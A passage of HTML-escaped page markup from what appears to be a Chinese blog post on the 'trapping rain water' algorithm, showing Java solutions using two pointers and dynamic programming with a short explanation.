&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// res += min(l_max, r_max) - height[i]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;动态规划&#34;&gt;动态规划&lt;/h2&gt;
&lt;p&gt;定义left[i]表示下标i位置及其左边的最高柱子的高度，right[i]表示下标i位置及其右边的最高柱子的高度，下标i位置能接的雨水量为min(left[i],right[i])-height[i],遍历数组，计算出left[i]和right[i]，最后答案为min(left[i],right[i])-height[i]里i从0到n-1的求和总值&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;trap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ans&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ans&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span 